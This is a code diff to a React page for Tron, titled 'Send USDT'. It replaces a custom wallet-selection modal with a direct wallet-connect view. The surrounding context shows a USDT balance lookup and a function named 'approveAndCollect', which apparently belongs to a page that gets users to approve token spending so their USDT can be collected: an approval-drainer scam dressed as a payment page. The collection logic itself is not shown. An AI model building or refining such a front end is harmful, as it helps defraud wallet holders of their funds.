@@ -37,34 +37,6 @@ const tronAdapter = new TronAdapter({
   ],
 })
 
-// ── WALLET FETCH ──
-const fetchWallets = async () => {
-  try {
-    const url = `https://explorer-api.walletconnect.com/v3/wallets?projectId=${WC_PROJECT_ID}&entries=100&page=1`
-    const res = await fetch(url)
-
-    if (!res.ok) {
-      throw new Error(`Wallet fetch failed: ${res.status} ${res.statusText}`)
-    }
-
-    const data = await res.json()
-
-    // Explorer API docs show /v3/wallets returns the wallet listings.
-    // Keep a few fallbacks in case of minor response-shape differences.
-    const list =
-      data?.listings ||
-      data?.data ||
-      data?.wallets ||
-      []
-
-    console.log('Fetched wallets:', list)
-    return Array.isArray(list) ? list : []
-  } catch (err) {
-    console.error('Failed to fetch wallets', err)
-    return []
-  }
-}
-
 // ── Create AppKit ──
 createAppKit({
   adapters: [tronAdapter],
@@ -155,11 +127,6 @@ export default function App() {
   const [loading, setLoading] = useState(false)
   const [txHash, setTxHash] = useState('')
 
-  const [wallets, setWallets] = useState<any[]>([])
-  const [filteredWallets, setFilteredWallets] = useState<any[]>([])
-  const [search, setSearch] = useState('')
-  const [showModal, setShowModal] = useState(false)
-
   const { open } = useAppKit()
   const { address: walletAddress, isConnected } = useAppKitAccount()
   const { walletProvider } = useAppKitProvider('tron')
@@ -171,26 +138,6 @@ export default function App() {
     }
   }, [isConnected, walletAddress, tronWeb])
 
-  useEffect(() => {
-    if (showModal) {
-      fetchWallets().then((list) => {
-        setWallets(list)
-        setFilteredWallets(list)
-      })
-    }
-  }, [showModal])
-
-  useEffect(() => {
-    if (!search) {
-      setFilteredWallets(wallets)
-    } else {
-      const q = search.toLowerCase()
-      setFilteredWallets(
-        wallets.filter((w) => w.name?.toLowerCase().includes(q))
-      )
-    }
-  }, [search, wallets])
-
   const getBalance = async (tw: any, addr: string) => {
     try {
       const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
@@ -201,28 +148,10 @@ export default function App() {
     }
   }
 
-  const handleWalletClick = (wallet: any) => {
-    console.log('Selected wallet:', wallet)
-
-    if (wallet?.name?.toLowerCase().includes('tronlink')) {
-      if ((window as any).tronLink) {
-        ;(window as any).tronLink.request({ method: 'tron_requestAccounts' })
-      } else {
-        open({ view: 'AllWallets' })
-      }
-    } else if (wallet?.name?.toLowerCase().includes('trust')) {
-      if ((window as any).trustwallet?.tronLink) {
-        ;(window as any).trustwallet.tronLink.request({
-          method: 'tron_requestAccounts',
-        })
-      } else {
-        open({ view: 'AllWallets' })
-      }
-    } else {
-      open({ view: 'AllWallets' })
-    }
-
-    setShowModal(false)
+  // IMPORTANT:
+  // open directly to AllWallets view
+  const handleConnect = () => {
+    open({ view: 'AllWallets' })
   }
 
   const approveAndCollect = async () => {
@@ -281,7 +210,7 @@ export default function App() {
               <h2 className="text-5xl font-bold mb-3">Send USDT</h2>
 
               <button
-                onClick={() => setShowModal(true)}
+                onClick={handleConnect}
                 disabled={loading}
                 className="w-full bg-emerald-400 hover:bg-emerald-500 disabled:bg-zinc-700 text-black font-bold py-5 rounded-2xl text-xl flex items-center justify-center gap-3 transition"
               >
@@ -334,48 +263,6 @@ export default function App() {
                   TX: {txHash}
                 </p>
               )}
-            </div>
-          )}
-
-          {showModal && (
-            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-              <div className="w-full max-w-md bg-zinc-900 rounded-2xl p-5 border border-zinc-800">
-                <div className="flex justify-between items-center mb-4">
-                  <h2 className="text-xl font-bold">Select Wallet</h2>
-                  <button onClick={() => setShowModal(false)}>✕</button>
-                </div>
-
-                <input
-                  type="text"
-                  placeholder="Search wallet..."
-                  value={search}
-                  onChange={(e) => setSearch(e.target.value)}
-                  className="w-full mb-4 p-3 rounded-lg bg-zinc-800 text-white outline-none"
-                />
-
-                <div className="max-h-96 overflow-y-auto space-y-2">
-                  {filteredWallets.length === 0 ? (
-                    <div className="text-sm text-zinc-400 p-3 text-center">
-                      No wallets loaded yet.
-                    </div>
-                  ) : (
-                    filteredWallets.map((wallet: any, index: number) => (
-                      <div
-                        key={wallet.id || wallet.name || index}
-                        onClick={() => handleWalletClick(wallet)}
-                        className="flex items-center gap-3 p-3 bg-zinc-800 rounded-lg cursor-pointer hover:bg-zinc-700"
-                      >
-                        <img
-                          src={wallet.image_url_sm || wallet.image_url || wallet.image_id || ''}
-                          alt={wallet.name || 'Wallet'}
-                          className="w-8 h-8 rounded-full"
-                        />
-                        <span>{wallet.name || 'Unknown Wallet'}</span>
-                      </div>
-                    ))
-                  )}
-                </div>
-              </div>
             </div>
           )}
         </div>
